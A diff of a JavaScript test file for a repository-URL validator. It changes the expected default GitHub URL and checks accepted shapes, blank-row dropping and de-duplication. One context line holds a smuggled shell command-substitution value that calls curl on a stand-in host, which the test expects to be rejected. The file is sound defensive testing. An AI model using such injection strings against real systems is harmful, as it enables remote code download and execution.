@@ -19,8 +19,8 @@ assert.strictEqual(validRepoUrl("$(curl evil.sh)"), null);
 
 // repoUrl: accepted shapes
 assert.strictEqual(
-	validRepoUrl("https://github.com/chatnarongt/nestjs-platform-express-node.git"),
-	"https://github.com/chatnarongt/nestjs-platform-express-node.git",
+	validRepoUrl("https://github.com/chatnarongt/nestjs-platform-fastify-pg-node-pg.git"),
+	"https://github.com/chatnarongt/nestjs-platform-fastify-pg-node-pg.git",
 );
 assert.strictEqual(
 	validRepoUrl("git@github.com:chatnarongt/demo.git"),
@@ -29,20 +29,20 @@ assert.strictEqual(
 assert.strictEqual(validRepoUrl("/tmp/opencode/repos/demo"), "/tmp/opencode/repos/demo");
 assert.strictEqual(
 	validRepoUrl(undefined),
-	"https://github.com/chatnarongt/nestjs-platform-express-node.git",
+	"https://github.com/chatnarongt/nestjs-platform-fastify-pg-node-pg.git",
 );
 
 // repoUrls: blank rows dropped (never defaulted), deduped, ordered
 assert.deepStrictEqual(
 	validRepoUrls([
-		"https://github.com/chatnarongt/nestjs-platform-express-node.git",
+		"https://github.com/chatnarongt/nestjs-platform-fastify-pg-node-pg.git",
 		"",
 		"  ",
 		"https://github.com/chatnarongt/nestjs-platform-express-bun.git",
-		"https://github.com/chatnarongt/nestjs-platform-express-node.git",
+		"https://github.com/chatnarongt/nestjs-platform-fastify-pg-node-pg.git",
 	]),
 	[
-		"https://github.com/chatnarongt/nestjs-platform-express-node.git",
+		"https://github.com/chatnarongt/nestjs-platform-fastify-pg-node-pg.git",
 		"https://github.com/chatnarongt/nestjs-platform-express-bun.git",
 	],
 );
